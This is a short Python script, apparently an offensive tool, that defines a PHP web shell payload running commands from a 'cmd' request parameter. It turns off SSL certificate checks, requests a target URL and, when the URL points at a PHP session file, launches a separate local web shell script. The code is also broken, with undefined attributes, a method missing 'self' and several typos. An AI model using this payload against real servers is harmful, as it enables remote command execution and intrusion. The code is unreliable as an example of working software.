#!/usr/bin/env python

import urllib.response
import time
import sys
import argparse
import mechanize
import ssl
import urllib
import re
import os
import subprocess
from subprocess import Popen, PIPE, check_output, Popen

ssl._create_default_https_context = ssl._create_unverified_context

class WebShellInteract:
    def __init__(self,**kwargs):
        self.WebShell()
    def Soures_Web():
            pass
    def WebShell(self,**kwargs):
        print('\n'+'='*20+"\n[*] WebShell Interact "+'\n'+'='*30+'\n')
        print("[+] Mothead             : ................ | : WebShell Active ")    
        print("[+] WebShell            : ................ | : <?php system(['cmd']);?>")
        print("[+] file access         : ................ | : "+self.args.read.replace("_",'/'))
        self.paylaodPHP = "<?php system($_GET['cmd']); ?>"  
        request = mechanize.Browser()
        request.set_handle_robots(False)
        request.set_handle_redirect(True)
        request.set_handle_refresh(True, max_time=1) 
        first_req = request.open(self.url).read()  
        if "sess_" in self.url : 
            path   =  "/usr/bin/python3  ./Package/shell/webshell.py" 
            run    = 'gnome-terminal  -- '+path
            xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)                      
           
if __name__=='__main__':
   WebShellInteract()       
